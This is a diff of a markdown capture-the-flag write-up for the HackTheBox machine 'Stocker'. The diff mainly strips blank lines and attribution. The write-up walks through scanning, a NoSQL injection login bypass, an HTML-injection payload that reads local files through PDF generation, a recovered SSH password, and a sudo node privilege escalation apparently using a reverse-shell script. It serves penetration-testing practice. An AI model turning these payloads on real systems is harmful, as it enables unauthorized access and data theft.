@@ -1,23 +1,16 @@
 # :game_die: HackTheBox Machine Stocker
 
-> **Original Source:** [HackTheBox Machine Stocker](https://infosecwriteups.com/htb-machine-stocker-b9ef41da3417)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 # HackTheBox Machine Stocker
 
-
 - Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture.
-
 
 You can also read this here: [https://aftabsama.com/writeups/hackthebox/machine-stocker/](https://aftabsama.com/writeups/hackthebox/machine-stocker/)
 
 ## HTB Machine Stocker
 
-
 we atart with nmap scan:
-
 
 ```
 ┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
@@ -38,18 +31,13 @@ PORT STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
 ```
 
-
 we have 2 ports open: 22(ssh) , 80(http)
-
 
 add `stocker.htb` to `/etc/hosts` file
 
-
 visiting this page we see one comment from `Angoose Garden, Head of IT at Stockers Ltd.`
 
-
 next we try to bruteforce subdomains:
-
 
 ```
 ┌──(Jack㉿Sparrow)-[~]
@@ -75,75 +63,53 @@ Progress: 4614 / 4615 (99.98%)
 ===============================================================
 ```
 
-
 again we need to add `dev.stocker.htb` to `/etc/hosts` file
-
 
 after few try and errors we found that login page is vulnerable to NoSQL Injection.
 
-
 `Content-Type: application/json`
-
 
 Payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`
 
-
 here we can purchase something through api and on view order it will generate pdf or that order.
-
 
 we can try to Read local file.
 
-
 ## Get Aftab Sama’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
 
-
 Path:`api/order` Payload:
-
 
 ```
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///etc/passwd'>","description":"It's a red cup.","image":"/etc/passwd","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 
-
 response:
-
 
 ```
 {"success":true,"orderId":"642550c92e188ca84f0a3f46"}
 ```
 
-
 we can see generated PDF at `/api/po/642550c92e188ca84f0a3f46`
 
-
 it is not complete we can modify our payload to:
-
 
 ```
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///var/www/dev/index.js' height=800 width=800>","description":"It's a red cup.","image":"Yo","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 
-
 result:
-
 
 we found Password: `IHeardPassphrasesArePrettySecure`
 
-
 previously we show one comment from Angoose Garden, Head of IT at Stockers Ltd.
-
 
 we can try this username:`Angoose` and password on ssh.
 
-
 chech root Permission using `sudo -l`
-
 
 ```
 angoose@stocker:~$ sudo -l
@@ -157,12 +123,9 @@ User angoose may run the following commands on stocker:
 (ALL) /usr/bin/node /usr/local/scripts/*.js
 ```
 
-
 we can escalate our privilege with node
 
-
 Payload:
-
 
 ```
 (function(){
@@ -179,19 +142,12 @@ return /a/; // Prevents the Node.js application from crashing
 })();
 ```
 
-
 Reference: [https://www.revshells.com/](https://www.revshells.com/)
-
 
 save this as js file and run using sudo and path traversal.
 
-
 Now we are root.
-
 
 Happy Hacking
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-machine-stocker-b9ef41da3417). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
